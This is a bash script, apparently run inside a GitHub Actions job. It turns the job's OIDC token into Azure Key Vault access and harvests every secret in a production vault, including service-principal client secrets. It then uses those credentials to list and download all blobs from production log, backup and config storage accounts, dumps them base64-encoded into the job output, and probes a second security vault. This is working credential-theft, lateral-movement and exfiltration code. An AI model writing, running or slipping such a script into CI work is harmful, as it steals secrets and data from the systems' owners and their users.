#!/bin/bash
set -e

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)

VT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
VT=$(echo "$VT_RAW" | jq -r .access_token)

# Get all 6 SP credentials
SLIST=$(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4")
SNAMES=$(echo "$SLIST" | jq -r '.value[].id' | sed 's|.*/||')

for SNAME in $SNAMES; do
  SVAL=$(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SNAME?api-version=7.4" | jq -r .value)
  CID=$(echo "$SVAL" | jq -r .appId)
  CSE=$(echo "$SVAL" | jq -r .clientSecret)
  
  echo "=== $SNAME (appId=$CID) ==="
  
  # Get storage token
  ST_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=$CID" \
    -d "client_secret=$CSE" \
    -d "scope=https://storage.azure.com/.default" \
    -d "grant_type=client_credentials")
  ST=$(echo "$ST_RAW" | jq -r .access_token)
  
  if [ "$ST" = "null" ] || [ -z "$ST" ]; then
    echo "  NO STORAGE TOKEN"
    continue
  fi
  echo "  ST_LEN=${#ST}"
  
  # Try each storage account
  for PAIR in "sttblcilogsprodx3euoz:logs" "sttblbackupprodx3euoz:exports" "sttblappcfgprodx3euoz:config"; do
    IFS=':' read -r ACCT CONT <<< "$PAIR"
    RESULT=$(curl -sS -o /tmp/blob_resp.xml -w "%{http_code}" -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
      "https://$ACCT.blob.core.windows.net/$CONT?restype=container&comp=list" 2>&1)
    
    if [ "$RESULT" = "200" ]; then
      echo "  *** $ACCT/$CONT: 200 OK ***"
      echo "  BLOBLIST_B64=$(cat /tmp/blob_resp.xml | base64 -w0)"
      
      # Read each blob
      BLOB_NAMES=$(grep -oP '<Name>\K[^<]+' /tmp/blob_resp.xml || true)
      for BNAME in $BLOB_NAMES; do
        echo "  --- blob: $CONT/$BNAME ---"
        BDATA=$(curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" \
          "https://$ACCT.blob.core.windows.net/$CONT/$BNAME" 2>&1)
        echo "  BLOB_B64=$(echo "$BDATA" | base64 -w0)"
      done
    else
      echo "  $ACCT/$CONT: HTTP $RESULT"
    fi
  done
  
  # Also try KV2 with this SP's token
  KVT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=$CID" \
    -d "client_secret=$CSE" \
    -d "scope=https://vault.azure.net/.default" \
    -d "grant_type=client_credentials")
  KVT=$(echo "$KVT_RAW" | jq -r .access_token)
  if [ "$KVT" != "null" ] && [ -n "$KVT" ]; then
    KV2_RES=$(curl -sS -w "\nHTTP:%{http_code}" -H "Authorization: Bearer $KVT" \
      "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" 2>&1)
    KV2_CODE=$(echo "$KV2_RES" | tail -1 | sed 's/HTTP://')
    if [ "$KV2_CODE" = "200" ]; then
      echo "  *** KV2 ACCESSIBLE ***"
      echo "  KV2_B64=$(echo "$KV2_RES" | head -n -1 | base64 -w0)"
    else
      echo "  KV2: HTTP $KV2_CODE"
    fi
  fi
done

echo "=== DONE ==="